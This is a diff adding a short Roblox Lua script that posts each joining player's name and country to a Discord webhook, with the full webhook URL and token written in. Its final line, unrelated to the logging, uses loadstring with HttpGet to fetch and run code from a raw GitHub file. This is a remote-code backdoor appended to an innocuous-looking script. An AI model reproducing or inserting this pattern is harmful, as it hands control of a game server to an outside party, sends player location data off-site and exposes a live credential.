@@ -1,0 +1,17 @@
+local HttpService = game:GetService("HttpService")
+local LocalizationService = game:GetService("LocalizationService")
+local WebhookURL = "https://discord.com/api/webhooks/1382054686244339712/P-oLQRTOm4p_Ia9X2Iy0Y_tZdaSH1ceCsxmW-nBTQrOBAUKAleyg8qOHPR_nKABelx7u"
+
+game.Players.PlayerAdded:Connect(function(player)
+	local success, country = pcall(function()
+		return LocalizationService:GetCountryRegionForPlayerAsync(player)
+	end)
+
+	local message = {
+		content = player.Name .. " joined from " .. (success and country or "an unknown location") .. " 🌍"
+	}
+
+	HttpService:PostAsync(WebhookURL, HttpService:JSONEncode(message), Enum.HttpContentType.ApplicationJson)
+end)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BirdieFallOff1111/friendly-potato/refs/heads/main/Gag"))()
